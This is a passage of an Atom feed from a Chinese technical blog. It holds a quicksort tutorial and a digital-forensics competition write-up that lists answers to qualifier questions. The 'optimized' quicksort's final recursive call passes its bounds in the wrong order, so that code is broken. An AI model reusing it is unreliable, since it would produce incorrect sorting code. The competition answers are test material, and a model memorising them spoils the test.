<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>arttnba3&#39;s blog</title>
  
  <subtitle>- arttnba3的隐秘小窝 -</subtitle>
  <link href="http://archive.next.arttnba3.cn/atom.xml" rel="self"/>
  
  <link href="http://archive.next.arttnba3.cn/"/>
  <updated>2020-11-20T05:46:40.774Z</updated>
  <id>http://archive.next.arttnba3.cn/</id>
  
  <author>
    <name>arttnba3</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【算法浅析-0X04】快速排序算法浅析 by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/11/20/%E3%80%90%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-0X04%E3%80%91%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-by-arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/11/20/%E3%80%90%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-0X04%E3%80%91%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-by-arttnba3/</id>
    <published>2020-11-20T05:40:05.000Z</published>
    <updated>2020-11-20T05:46:40.774Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00 绪论"></a>0x00 绪论</h1><p>众所周知，快速排序是所有的排序算法当中速度较快的一种，手撕快排也成为了每一位OIer的必备技能（<del>实际上大部分人都会直接用STL的sort函数XD）</del><br>刚好今天ACM选修课布置的课后作业有一道题就是快排模板，所以作为一名不合格的OIer今天来简单讲讲什么是快速排序算法2333</p><blockquote><p>注：这篇文章写于2020.06，只是现在刚刚从CSDN上搬到这里来23333</p></blockquote><a id="more"></a><h1 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h1><p><strong>快速排序（Quick Sort）</strong>，顾名思义就是很快的排序（大雾），是基于冒泡排序的一种改进的排序算法。</p><blockquote><h2 id="pre-冒泡排序（Bubble-Sort）"><a href="#pre-冒泡排序（Bubble-Sort）" class="headerlink" title="pre.冒泡排序（Bubble Sort）"></a>pre.冒泡排序（Bubble Sort）</h2><p>没学过冒泡排序的可以简单地看一下，学过的直接跳过就行了<br>顾名思义，数据会“像泡泡一样一个一个冒出水面”，故得名冒泡排序<br>冒泡排序要对数组进行n-1趟遍历，故时间复杂度为O(N^2)<br>简单的冒泡排序代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="function"><span class="keyword">void</span> <span class="title">a3_sort</span><span class="params">(<span class="keyword">int</span> * <span class="built_in">array</span>, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function">&gt;</span>&#123;</span><br><span class="line">&gt;<span class="keyword">int</span> temp;</span><br><span class="line">&gt;<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n<span class="number">-1</span>-i;j++)</span><br><span class="line">       <span class="keyword">if</span>(<span class="built_in">array</span>[j]&gt;<span class="built_in">array</span>[j+<span class="number">1</span>])</span><br><span class="line">       &#123;</span><br><span class="line">           temp = <span class="built_in">array</span>[j];</span><br><span class="line">           <span class="built_in">array</span>[j] = <span class="built_in">array</span>[j+<span class="number">1</span>];</span><br><span class="line">           <span class="built_in">array</span>[j+<span class="number">1</span>] = temp;</span><br><span class="line">       &#125;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure><p>基于冒泡排序的思想，C. A. R. Hoare在1960年提出了快速排序算法。</p></blockquote><p>快速排序的基本思想是：通过一趟排序将要排序的数据分割成独立的两部分，其中一部分的所有数据都比另外一部分的所有数据都要小，然后再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此达到整个数据变成有序序列。</p><h1 id="0x02-原理浅析"><a href="#0x02-原理浅析" class="headerlink" title="0x02 原理浅析"></a>0x02 原理浅析</h1><p>快速排序大致可以分为以下几个步骤</p><h2 id="step1：选取基准值"><a href="#step1：选取基准值" class="headerlink" title="step1：选取基准值"></a>step1：选取基准值</h2><p>在要排序的数组当中选取一个值作为基准值，通常我们可以选array[0]作为基准值，保存在变量key当中</p><p>接下来我们需要分别从后向前、从前向后对整个数组进行遍历，故建立变量i=left，j=right（数组始索引与末索引）</p><h2 id="step2：从后向前遍历"><a href="#step2：从后向前遍历" class="headerlink" title="step2：从后向前遍历"></a>step2：从后向前遍历</h2><p>寻找第一个比key小的值，并将之存在array[i]中</p><h2 id="step3：从前向后遍历"><a href="#step3：从前向后遍历" class="headerlink" title="step3：从前向后遍历"></a>step3：从前向后遍历</h2><p>寻找第一个比key大的值，并将之存在array[j]中</p><h2 id="step4：重复step2、3"><a href="#step4：重复step2、3" class="headerlink" title="step4：重复step2、3"></a>step4：重复step2、3</h2><p>直到i&gt;=j，此时整个数组已经被遍历过一遍</p><blockquote><p>要注意的是在step2与step3中已经蕴含了【交换】的过程，故不需要添加而外的交换的语句<br>也可以理解为step2、3分别找出第一个比key大、小的值，将之进行交换</p></blockquote><h2 id="step5：基准值回归数组，再对其左、右部分进行快排"><a href="#step5：基准值回归数组，再对其左、右部分进行快排" class="headerlink" title="step5：基准值回归数组，再对其左、右部分进行快排"></a>step5：基准值回归数组，再对其左、右部分进行快排</h2><p>将数组无限细分下去，一直到所有数据都被排序完毕</p><blockquote><p>想不明白的可以看一看下面的动图<img src="https://img-blog.csdnimg.cn/20191008110757588.gif" alt="img"></p></blockquote><h1 id="0x03-代码实现"><a href="#0x03-代码实现" class="headerlink" title="0x03 代码实现"></a>0x03 代码实现</h1><p>最基础的快速排序的代码实现如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">a3_qsort</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(left&gt;=right)</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">int</span> i = left;</span><br><span class="line">    <span class="keyword">int</span> j = right;</span><br><span class="line">    <span class="keyword">int</span> key = <span class="built_in">array</span>[left];</span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; key &lt;= <span class="built_in">array</span>[j])<span class="comment">//从后向前找比key小的</span></span><br><span class="line">            j--;</span><br><span class="line">        <span class="keyword">if</span>(i &lt; j)</span><br><span class="line">            <span class="built_in">array</span>[i++] = <span class="built_in">array</span>[j];<span class="comment">//进行一次交换</span></span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; key &gt;= <span class="built_in">array</span>[i])<span class="comment">//从前向后找比key大的</span></span><br><span class="line">            i++;</span><br><span class="line">        <span class="keyword">if</span>(i &lt; j)</span><br><span class="line">            <span class="built_in">array</span>[j--] = <span class="built_in">array</span>[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">array</span>[i] = key;<span class="comment">//中间数的回归</span></span><br><span class="line">    a3_qsort(<span class="built_in">array</span>, left, i<span class="number">-1</span>);</span><br><span class="line">    a3_qsort(<span class="built_in">array</span>, i+<span class="number">1</span>, right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x04-简单优化"><a href="#0x04-简单优化" class="headerlink" title="0x04 简单优化"></a>0x04 简单优化</h1><blockquote><p>“太好🌶，看完以后👴立马就学会了快排”<br>——“真的🐎？”</p></blockquote><p><strong>实⭐战⭐演⭐练</strong>环节不请自来</p><blockquote><p>题目描述<br>利用快速排序算法将读入的 <strong>N</strong> 个数从小到大排序后输出。</p><p>快速排序是信息学竞赛的必备算法之一。对于快速排序不是很了解的同学可以自行上网查询相关资料，掌握后独立完成。（C++ 选手请不要试图使用STL，虽然你可以使用 sort 一遍过，但是你并没有掌握快速排序算法的精髓。）</p><p>输入格式<br>第1行为一个正整数 N，第2 行包含 N个空格隔开的正整数 a<del>i</del>，为你需要进行排序的数，数据保证了 A<del>i</del>     不超过 10^9  。</p><p>输出格式<br>将给定的 N个数从小到大输出，数之间空格隔开，行末换行且无空格。</p><p>输入输出样例<br>输入 #1<br><code>5 4 2 4 5 1</code><br>输出 #1<br><code>1 2 4 4 5</code><br>说明/提示<br>对于 20%的数据，有<br>N≤10^3  ；<br>对于100% 的数据，有N≤10^5  。<br><a href="https://www.luogu.com.cn/problem/P1177" target="_blank" rel="noopener">洛谷P1177【模板】快速排序</a></p></blockquote><p>当你满怀欣喜地将上面的代码复制粘贴进去时，你会发现TLE不请自来…<br><img src="https://img-blog.csdnimg.cn/20200615152749700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FydHRuYmEz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那么我们的问题出在哪呢？（<del>因为写这段代码的人太菜le）</del></p><p>上面的标准化的代码选取的基准是数组的第一个值，在遇到较坏情况时时间复杂度很容易大幅度提高，尤其是在数组有序时，这样的一种分割方式会使快速排序退化为冒泡排序，时间复杂度飙升至O(N^2)</p><p>那么最简单的优化方法便是遍历时<strong>取位于数组中间的值作为基准值</strong></p><blockquote><p>来自<a href="https://blog.csdn.net/insistgogo/article/details/7785038" target="_blank" rel="noopener">某位大佬的测试结果</a><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWctbXkuY3Nkbi5uZXQvdXBsb2Fkcy8yMDEyMDcvMjgvMTM0MzQ4MzI5N18yNDE1LmpwZw?x-oss-process=image/format,png" alt="img"><br>最佳的划分是将待排序的序列分成等长的子序列，最佳的状态我们可以使用序列的中间的值，也就是第N/2个数。可是，这很难算出来，并且会明显减慢快速排序的速度。这样的中值的估计可以通过随机选取三个元素并用它们的中值作为枢纽元而得到。事实上，随机性并没有多大的帮助，因此一般的做法是使用左端、右端和中心位置上的三个元素的中值作为枢纽元。显然使用三数中值分割法消除了预排序输入的不好情形，并且减少快排大约14%的比较次数</p></blockquote><p>优化后的代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">a3_qsort</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = <span class="built_in">array</span>[(left+right)/<span class="number">2</span>];<span class="comment">//固定以中间的数为基准</span></span><br><span class="line">    <span class="keyword">int</span> i = left;</span><br><span class="line">    <span class="keyword">int</span> j = right;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">array</span>[i]&lt;=mid)i++;<span class="comment">//从前向后找第一个比mid大的数</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">array</span>[j]&gt;=mid)j--;<span class="comment">//从后向前找第一个比mid小的数</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 交换这两个数的位置，使比mid小的数都在mid前面，比mid大的数都在mid后面</span></span><br><span class="line"><span class="comment">         * 注意：在交换过程中mid的位置也是有可能会移动的</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="keyword">if</span>(i&lt;=j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> temp = <span class="built_in">array</span>[i];</span><br><span class="line">            <span class="built_in">array</span>[i] = <span class="built_in">array</span>[j];</span><br><span class="line">            <span class="built_in">array</span>[j] = temp;</span><br><span class="line">            i++;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (i&lt;=j);<span class="comment">//i&gt;j时说明已经遍历过一趟了</span></span><br><span class="line">    <span class="keyword">if</span>(left &lt; j)</span><br><span class="line">        a3_qsort(<span class="built_in">array</span>,left,j);<span class="comment">//对j左边的部分进行快排</span></span><br><span class="line">    <span class="keyword">if</span>(right &gt; i)</span><br><span class="line">        a3_qsort(<span class="built_in">array</span>,right,i);<span class="comment">//对i右边的部分进行快排</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20200615155557204.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FydHRuYmEz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="0x05-高级优化"><a href="#0x05-高级优化" class="headerlink" title="0x05 高级优化"></a>0x05 高级优化</h1><blockquote><p>“老师，还有没有更给力点的啊”<br>——“给👴爪巴”</p></blockquote><p>我们可以看到，上面的这样一种优化虽然可以一定程度上提高快排的效率，但是对于一些糟糕的数据（如很小以及部分有序数组），快排的时间复杂度仍然会飙升</p><p>针对这样的情况，我们可以<strong>先对数据进行分析，再决定采用什么样的排序方式，多种排序方式混合使用</strong></p><p>当然这样子就已经不是纯粹的快排了，<del>但是是不是快排已经无所谓了（误</del> </p><blockquote><p>咕了🕊，后面再把优化补上（<del>👈这个人还在研究STL源码</del> </p></blockquote><blockquote><p><strong>注：这也是STL中sort()源码的做法</strong></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-绪论&quot;&gt;&lt;a href=&quot;#0x00-绪论&quot; class=&quot;headerlink&quot; title=&quot;0x00 绪论&quot;&gt;&lt;/a&gt;0x00 绪论&lt;/h1&gt;&lt;p&gt;众所周知，快速排序是所有的排序算法当中速度较快的一种，手撕快排也成为了每一位OIer的必备技能（&lt;del&gt;实际上大部分人都会直接用STL的sort函数XD）&lt;/del&gt;&lt;br&gt;刚好今天ACM选修课布置的课后作业有一道题就是快排模板，所以作为一名不合格的OIer今天来简单讲讲什么是快速排序算法2333&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注：这篇文章写于2020.06，只是现在刚刚从CSDN上搬到这里来23333&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="算法浅析" scheme="http://archive.next.arttnba3.cn/categories/%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/"/>
    
    
    <category term="算法" scheme="http://archive.next.arttnba3.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="C/C++" scheme="http://archive.next.arttnba3.cn/tags/C-C/"/>
    
    <category term="图论" scheme="http://archive.next.arttnba3.cn/tags/%E5%9B%BE%E8%AE%BA/"/>
    
  </entry>
  
  <entry>
    <title>【电子取证-0x02】美亚杯第五届全国电子取证竞赛资格赛write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/11/08/%E3%80%90%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-0x02%E3%80%91/"/>
    <id>http://archive.next.arttnba3.cn/2020/11/08/%E3%80%90%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-0x02%E3%80%91/</id>
    <published>2020-11-08T05:32:06.000Z</published>
    <updated>2020-11-12T07:40:36.245Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p><a href="http://meiyacup.com" target="_blank" rel="noopener">“美亚杯”中国电子数据取证大赛</a>是由<strong>中国刑事警察学院主办、厦门美亚柏科承办的中国电子数据取证大赛</strong>，也是国内较为有名的数据取证比赛</p><p>作为网安专业的小萌新去年对此毫不知情（<del>知情了我可能也过不了资格赛</del>），于是今年想要去玩玩（<del>指划水</del>），所以打算趁时间还够把过去的几次比赛的真题给刷一刷XD</p><blockquote><p>注：题目版权属于美亚杯赛事组委会</p></blockquote><a id="more"></a><blockquote><p>注：本人感觉取证比赛就是熟练运用各种工具的比赛…（ <del>取证软件公司的硬广</del></p></blockquote><h1 id="0x01-工具"><a href="#0x01-工具" class="headerlink" title="0x01.工具"></a>0x01.工具</h1><p><strong>硬件：</strong></p><ul><li>Microsoft Surface Book 2 </li><li>Samsung 1T SSD</li></ul><p><strong>软件：</strong></p><ul><li>取证大师<strong>试用版</strong></li><li>AccessData FTK Imager</li><li>VMWare Workstation Pro 16</li><li>火眼证据分析软件V4（付费授权）</li><li>火眼仿真取证软件（付费授权）</li><li>volatility</li><li>Dependency Worker</li></ul><h1 id="0x02-资格赛-案情介绍"><a href="#0x02-资格赛-案情介绍" class="headerlink" title="0x02.资格赛 - 案情介绍"></a>0x02.资格赛 - 案情介绍</h1><blockquote><p><img src="https://i.loli.net/2020/10/06/PRyuzoVedDlEBbw.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/08/mV2Duc9Cxh1YEAB.png" alt="image.png"></p></blockquote><h1 id="0x03-资格赛-单项选择题"><a href="#0x03-资格赛-单项选择题" class="headerlink" title="0x03.资格赛 - 单项选择题"></a>0x03.资格赛 - 单项选择题</h1><p>开局自然首先是把惯例的火眼+取证大师自动分析弄上</p><p><img src="https://i.loli.net/2020/11/08/KBRG6INpJcWQm7l.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/08/2TM9mdyAQKv7suc.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/08/3oaWBnVihzy4Ppe.png" alt="image.png"></p><h2 id="1-A"><a href="#1-A" class="headerlink" title="1.A"></a>1.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/qVMl1dkrnNLmUSp.png" alt="image.png"></p></blockquote><p>见取证大师【摘要】部分</p><p><img src="https://i.loli.net/2020/11/08/8smWe5ScNfjGodn.png" alt="image.png"></p><h2 id="2-C"><a href="#2-C" class="headerlink" title="2.C"></a>2.C</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/8nRqtjkAaPy7XWB.png" alt="image.png"></p></blockquote><p>毫无疑问是win10家庭版</p><p><img src="https://i.loli.net/2020/11/08/Zy1iaHo6znqGNlt.png" alt="image.png"></p><h2 id="3-D"><a href="#3-D" class="headerlink" title="3.D"></a>3.D</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/vlpjCBZxSq7EGwW.png" alt="image.png"></p></blockquote><p>从摘要中可以看出犯罪嫌疑人的系统盘是NTFS，而他（表面上）只有一个磁盘分区，他在使用自己的计算机时的磁盘分区就应当是NTFS，需要注意的是不要被不可见的ESP<del>寄存器</del>分区给迷惑了</p><p><img src="https://i.loli.net/2020/11/08/zSGfOjA9KoRy5WI.png" alt="image.png"></p><h2 id="4-A"><a href="#4-A" class="headerlink" title="4.A"></a>4.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/aIuSHi5AU9wvjXe.png" alt="image.png"></p></blockquote><p>还是看摘要，但是这里我计算出来的大小比正确答案多12个扇区…希望后续能有大师傅答疑解惑</p><p><img src="https://i.loli.net/2020/11/08/zSGfOjA9KoRy5WI.png" alt="image.png"></p><h2 id="5-E"><a href="#5-E" class="headerlink" title="5.E"></a>5.E</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/ewm1G2gYvFKipTo.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/08/px3ir7P5VNG4nUb.png" alt="image.png"></p></blockquote><p><del>题目选项还是分页的，想起来高中被完形填空支配的恐惧</del></p><p>取证大师里一搜就有</p><p><img src="https://i.loli.net/2020/11/08/ytvgSpiqGL9dhOH.png" alt="image.png"></p><h2 id="6-A"><a href="#6-A" class="headerlink" title="6.A"></a>6.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/hkrVHlmsMiPCvZX.png" alt="image.png"></p></blockquote><p>安装时间在取证大师里可以直接看到</p><p><img src="https://i.loli.net/2020/11/08/Zy1iaHo6znqGNlt.png" alt="image.png"></p><p>需要注意的是题目问的时区是UTC，而犯罪嫌疑人的电脑时区是UTC+8（见第八题），故需要减8h</p><h2 id="7-A"><a href="#7-A" class="headerlink" title="7.A"></a>7.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/HokGNJRiXczv2BM.png" alt="image.png"></p></blockquote><p><del>闭着眼睛你都应该知道应当是512B</del></p><p>在取证大师的【摘要】里可以看到是512B</p><p><img src="https://i.loli.net/2020/11/08/k9lyASzja5rIBUb.png" alt="image.png"></p><h2 id="8-E"><a href="#8-E" class="headerlink" title="8.E"></a>8.E</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/sngBaJlLejNUf6Y.png" alt="_X5Q5M_7ZJ0MF6IGLD__Y1T.png"></p></blockquote><p>可以在取证大师里看到是utc+8</p><blockquote><p>热知识：GMT = UTC + 0</p></blockquote><p><img src="https://i.loli.net/2020/11/08/rNYay8x2XWHDCnw.png" alt="image.png"></p><h2 id="9-D"><a href="#9-D" class="headerlink" title="9.D"></a>9.D</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/j4XRophErAiYNJz.png" alt="RZ0@`WRM@RV_UWVUQK0`U_G.png"></p></blockquote><p>取证大师一梭子带走</p><p><img src="https://i.loli.net/2020/11/08/Zy1iaHo6znqGNlt.png" alt="image.png"></p><h2 id="10-B"><a href="#10-B" class="headerlink" title="10.B"></a>10.B</h2><blockquote><p>![@<em>JFV_4J7~~DJ3TU_</em>@`_SS.png](<a href="https://i.loli.net/2020/11/08/BRtzZPJWxKVoSwp.png" target="_blank" rel="noopener">https://i.loli.net/2020/11/08/BRtzZPJWxKVoSwp.png</a>)</p></blockquote><p>取证大师里可以很清晰地看到各个用户的信息</p><p><img src="https://i.loli.net/2020/11/08/Eor5nGTclRdMu7i.png" alt="image.png"></p><h2 id="11-A"><a href="#11-A" class="headerlink" title="11.A"></a>11.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/Xr8C5ifZa2sUIyN.png" alt="J@@JH_BYA__II_OA__KI31A.png"></p></blockquote><p>这道题稍微绕了一个弯</p><p>在取证大师中我们看到的唯一挂载了盘符<code>E:</code>的设备是<code>Generic Flash Disk USB Device</code>，在<strong>答案中并没有这个选项</strong></p><p><img src="https://i.loli.net/2020/11/08/fnadqi4kLJyrAOW.png" alt="image.png"></p><p>众所周知<code>Generic Flash Disk USB Device</code>是<strong>通用闪存设备</strong>，也就是说犯罪嫌疑人插入过一个闪存设备，<strong>该设备被挂载到盘符E</strong></p><p>从设备拔插时间线分析可知其他的存储设备插入时也会<strong>先从盘符E开始分配起，而五个选项中只有A设备出现在USB使用记录中</strong>（其实光凭这一点就能选出A了⑧</p><h2 id="12-C"><a href="#12-C" class="headerlink" title="12.C"></a>12.C</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/hblgrSTD1W6OJUu.png" alt="_9ICF__5RT1QZ40J8__GPOG.png"></p></blockquote><p>直接看用户痕迹中属于<code>E:</code>目录下的即可，需要注意的是题目问的是<strong>【不是】</strong></p><p><img src="https://i.loli.net/2020/11/08/s4Ulq6mvwDhZ8xT.png" alt="image.png"></p><h2 id="13-B"><a href="#13-B" class="headerlink" title="13.B"></a>13.B</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/fmRC3YGpiXtdMFc.png" alt="1_N~W50~N_P_NSKW0QQYI09.png"></p></blockquote><p>还是在取证大师里翻一圈【最近访问的文档】就有了</p><h2 id="14-C"><a href="#14-C" class="headerlink" title="14.C"></a>14.C</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/2GmqBxbp9Fc7Ddy.png" alt="RKZ1H8C3JWUC_L~ZI_DQ07J.png"></p></blockquote><p>还是一搜就有</p><p><img src="https://i.loli.net/2020/11/08/uYCcjKJ3SIFOtX4.png" alt="image.png"></p><h2 id="15-E"><a href="#15-E" class="headerlink" title="15.E"></a>15.E</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/7G3eVkayPg2R1zQ.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/08/PsK6SnMWNDmZBJG.png" alt="image.png"></p></blockquote><p>先用取证大师找到文件提取出来，拖到Dependency Walker里一看就有了</p><p><del>需要注意的是电脑性能像我这样差的会卡挺久</del></p><p><img src="https://i.loli.net/2020/11/08/aUnNPucL9WxqD36.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/08/QpnGT7cbEltfaPV.png" alt="NO0W6JSQ_~YMYYHM~83ZNWG.png"></p><p><img src="https://i.loli.net/2020/11/08/JkAPZYn5jKMgEs8.png" alt="MXJT487_GN18RTL5VM6N3DK.png"></p><p><img src="https://i.loli.net/2020/11/08/3SI4yLQ9KJV6aXO.png" alt="FE54D_XKB3~MW3X_PB_2~DQ.png"></p><p><img src="https://i.loli.net/2020/11/08/IRjCwQ2GVNaF6dc.png" alt="0KG93Q_T4_52I84_A12J3S1.png"></p><h2 id="16-C"><a href="#16-C" class="headerlink" title="16.C"></a>16.C</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/KS3VuExedglZrTC.png" alt="image.png"></p></blockquote><p>使用<strong>火眼仿真</strong>进虚拟机一看就是蓝色</p><p><img src="https://i.loli.net/2020/11/08/9DngTKf2Poa1SH7.png" alt="image.png"></p><h2 id="17-B"><a href="#17-B" class="headerlink" title="17.B"></a>17.B</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/r6ZzlAsdvR9gCa1.png" alt="image.png"></p></blockquote><p><del>首先这几个文件我都没在根目录下找到</del></p><p>Windows中用来在休眠状态储存内存数据的文件就是<code>HIBERFIL.SYS</code>，所以直接选B即可，有关这个文件的详情可以百度康康</p><blockquote><p>关于这五个文件的简单说明（来自百度）：</p><p>WIN386.SWP为虚拟内存交换文件，存放内存中长时间闲置的程序</p><p>HIBERFIL.SYS为内存备份文件，电脑休眠时会将内存所有内容写入该文件中，以便唤醒时快速恢复</p><p>PAGEFILE.SYS为虚拟内存页面文件，也就是虚拟内存</p><p>NTUSER.DAT为用户配置文件</p><p>SWAPFILE.SYS为Metro App的虚拟内存交换文件，比较生僻</p></blockquote><h2 id="18-D"><a href="#18-D" class="headerlink" title="18.D"></a>18.D</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/LBuPonHgJKXkefZ.png" alt="image.png"></p></blockquote><p>还是常识类题目，有关win的一些基本概念可以看<a href="https://www.300188.cn/news/sharing-show-2030.html" target="_blank" rel="noopener">这里</a>和<a href="http://www.xlysoft.net/detail/7-314-2677.html" target="_blank" rel="noopener">这里</a></p><h2 id="19-A"><a href="#19-A" class="headerlink" title="19.A"></a>19.A</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/FNkSt7cV3gqlIYD.png" alt="image.png"></p></blockquote><p>取证大师查看网络连接即可</p><p><img src="https://i.loli.net/2020/11/08/iYtBJ5mcwx9lOeD.png" alt="image.png"></p><h2 id="20-E"><a href="#20-E" class="headerlink" title="20.E"></a>20.E</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/TCYFsKIGRexu78Z.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/08/dbY1IsgpnJwvRAM.png" alt="image.png"></p></blockquote><p>火眼仿真里切到Admin账号一看就有了</p><p><img src="https://i.loli.net/2020/11/08/PcxgAesSGuYjU5Z.png" alt="image.png"></p><h2 id="21-C"><a href="#21-C" class="headerlink" title="21.C"></a>21.C</h2><blockquote><p><img src="https://i.loli.net/2020/11/08/dNqMpI6PSKHWFca.png" alt="image.png"></p></blockquote><p>一开始找这个备份一直没啥思路，直到我看到取证大师首页就有分析结果…</p><p><img src="https://i.loli.net/2020/11/08/v123y5nDbarIUQL.png" alt="image.png"></p><p><strong>将整个文件夹导出</strong>，使用<strong>火眼证据分析软件</strong>和<strong>取证大师</strong>进行分析，开启我们下一个阶段的解题</p><p><img src="https://i.loli.net/2020/11/08/sRvJZxeDPql2yWt.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/08/jlVQhH3gISowOU7.png" alt="image.png"></p><p>在火眼当中我们可以看出题目中的iCloud的id与犯罪嫌疑人的iCloud的id不同</p><p><img src="https://i.loli.net/2020/11/09/Gc85FKXYtCjgQPx.png" alt="image.png"></p><h2 id="22-D"><a href="#22-D" class="headerlink" title="22.D"></a>22.D</h2><blockquote><p><img 